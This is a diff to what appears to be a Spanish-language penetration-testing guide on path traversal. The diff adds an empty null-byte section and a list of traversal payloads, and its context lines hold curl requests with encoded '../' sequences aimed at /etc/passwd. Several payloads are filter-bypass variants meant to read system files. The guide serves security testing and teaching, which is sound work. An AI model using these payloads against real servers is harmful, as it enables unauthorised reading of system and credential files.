@@ -27,6 +27,21 @@ curl -X GET "http://{HOST}/vulnerable?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
 ```bash	
 curl -X GET "http://{HOST}/vulnerable?file=%252e%252e%252fetc%252fpasswd"
 ```
+* Null byte bypass
+
+```bash
+
+```
+
+* Posibles payloads:
+
+```bash
+../../../etc/passwd
+....//....//....//....//etc/passwd
+../../../etc/passwd%00.<file_extension>// .jpg .pdf .txt etc
+/var/www/html/images/../../../etc/passwd
+```
+
 3. Comprobar diferentes sistemas operativos:
 	
 * Windows: 
